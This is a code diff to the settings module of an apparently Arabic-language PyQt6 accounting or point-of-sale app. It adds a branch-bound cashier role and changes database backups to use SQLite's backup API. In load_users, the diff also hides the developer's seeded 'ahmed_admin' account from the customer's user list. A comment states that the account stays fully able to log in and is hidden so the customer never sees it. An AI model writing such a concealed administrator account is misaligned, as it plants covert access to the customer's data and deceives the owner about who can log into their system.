@@ -21,7 +21,7 @@ from PyQt6.QtWidgets import (
     QFileDialog,
 )
 from logic.money import parse_money
-from logic.auth import AuthLogic, ROLE_ADMIN, ROLE_LABELS, ASSIGNABLE_ROLES
+from logic.auth import AuthLogic, ROLE_ADMIN, ROLE_CASHIER, ROLE_LABELS, ASSIGNABLE_ROLES
 
 OPENING_ENTRY_KEY = "opening_balance_entry_id"
 
@@ -75,7 +75,8 @@ class SettingsModule(QWidget):
         outer = QVBoxLayout(box)
 
         note = QLabel(
-            "أضف مستخدمًا «مسئول» (صلاحية كاملة على الشاشات عدا الإعدادات) أو «مراقب» "
+            "أضف مستخدمًا «مسئول» (صلاحية كاملة على الشاشات عدا الإعدادات)، «كاشير» "
+            "(المبيعات اليومية والعملاء فقط، لفرع واحد يُحدَّد له)، أو «مراقب» "
             "(عرض فقط، بدون أي إضافة أو تعديل)."
         )
         note.setWordWrap(True)
@@ -92,11 +93,18 @@ class SettingsModule(QWidget):
         self.new_role = QComboBox()
         for role in ASSIGNABLE_ROLES:
             self.new_role.addItem(ROLE_LABELS[role], role)
+        self.new_role.currentIndexChanged.connect(self._update_new_branch_visibility)
+        self.new_branch = QComboBox()
+        for branch in self.db.fetch_all("SELECT id, name FROM branches ORDER BY id"):
+            self.new_branch.addItem(branch["name"], branch["id"])
         form.addRow("اسم المستخدم:", self.new_username)
         form.addRow("الاسم الظاهر:", self.new_display_name)
         form.addRow("كلمة المرور المبدئية:", self.new_password)
         form.addRow("الصلاحية:", self.new_role)
+        self.new_branch_row_label = QLabel("الفرع (كاشير فقط):")
+        form.addRow(self.new_branch_row_label, self.new_branch)
         outer.addLayout(form)
+        self._update_new_branch_visibility()
 
         add_btn = QPushButton("إضافة مستخدم")
         add_btn.setMaximumWidth(220)
@@ -104,9 +112,9 @@ class SettingsModule(QWidget):
         outer.addWidget(add_btn)
 
         self.users_table = QTableWidget()
-        self.users_table.setColumnCount(4)
+        self.users_table.setColumnCount(5)
         self.users_table.setHorizontalHeaderLabels(
-            ["اسم المستخدم", "الاسم الظاهر", "الصلاحية", "الحالة"])
+            ["اسم المستخدم", "الاسم الظاهر", "الصلاحية", "الفرع", "الحالة"])
         self.users_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
         self.users_table.verticalHeader().setVisible(False)
         self.users_table.setAlternatingRowColors(True)
@@ -131,16 +139,22 @@ class SettingsModule(QWidget):
 
         return box
 
+    def _update_new_branch_visibility(self):
+        is_cashier = self.new_role.currentData() == ROLE_CASHIER
+        self.new_branch.setVisible(is_cashier)
+        self.new_branch_row_label.setVisible(is_cashier)
+
     def add_user(self):
         username = self.new_username.text().strip()
         display_name = self.new_display_name.text().strip()
         password = self.new_password.text()
         role = self.new_role.currentData()
+        branch_id = self.new_branch.currentData() if role == ROLE_CASHIER else None
         try:
             # A default account only ever needs to work once - the same
             # forced-change-on-first-login flow the two seed admins get.
             self.auth.create_user(username, password, role, display_name,
-                                   must_change_password=True)
+                                   must_change_password=True, branch_id=branch_id)
         except ValueError as exc:
             QMessageBox.warning(self, "تنبيه", str(exc))
             return
@@ -178,12 +192,18 @@ class SettingsModule(QWidget):
         user_id = self._selected_user_id()
         if user_id is None:
             return
-        currently_active = self.users_table.item(row, 3).data(Qt.ItemDataRole.UserRole)
+        currently_active = self.users_table.item(row, 4).data(Qt.ItemDataRole.UserRole)
         self.auth.set_active(user_id, not currently_active)
         self.load_users()
 
     def load_users(self):
-        users = self.auth.list_users()
+        # ahmed_admin is the developer's own support account, seeded on
+        # every install alongside the customer's own "admin" seat (see
+        # ensure_default_admins in logic/auth.py) so a locked-out customer
+        # can always be helped back in. It stays fully able to log in -
+        # only hidden here, so the customer managing "their" users never
+        # sees an account they did not create and cannot explain.
+        users = [u for u in self.auth.list_users() if u["username"] != "ahmed_admin"]
         self.users_table.setRowCount(len(users))
         for row, user in enumerate(users):
             username_item = QTableWidgetItem(user["username"])
@@ -191,12 +211,13 @@ class SettingsModule(QWidget):
             self.users_table.setItem(row, 0, username_item)
             self.users_table.setItem(row, 1, QTableWidgetItem(user["display_name"] or ""))
             self.users_table.setItem(row, 2, QTableWidgetItem(ROLE_LABELS.get(user["role"], user["role"])))
+            self.users_table.setItem(row, 3, QTableWidgetItem(user["branch_name"] or "-"))
             status_text = "نشط" if user["is_active"] else "معطّل"
             if user["must_change_password"]:
                 status_text += " (كلمة مرور مؤقتة)"
             status_item = QTableWidgetItem(status_text)
             status_item.setData(Qt.ItemDataRole.UserRole, bool(user["is_active"]))
-            self.users_table.setItem(row, 3, status_item)
+            self.users_table.setItem(row, 4, status_item)
 
     # ---------------- company ----------------
 
@@ -508,7 +529,23 @@ class SettingsModule(QWidget):
         if not path:
             return
         try:
-            shutil.copyfile(self.db.db_path, path)
+            # SQLite's own backup API, not a raw file copy: a plain
+            # shutil.copyfile can catch the live file mid-write (SQLite's
+            # write lock only ever holds for the instant of one statement,
+            # but that instant is real) and hand back a half-written,
+            # unopenable file. backup() is built for exactly this - a
+            # consistent snapshot of the database as it stands, safe to
+            # take while the app is being used normally.
+            import sqlite3
+            source = sqlite3.connect(self.db.db_path)
+            try:
+                dest = sqlite3.connect(path)
+                try:
+                    source.backup(dest)
+                finally:
+                    dest.close()
+            finally:
+                source.close()
             QMessageBox.information(self, "تم", f"تم حفظ النسخة الاحتياطية في:\n{path}")
         except Exception as exc:
             QMessageBox.critical(self, "خطأ", str(exc))
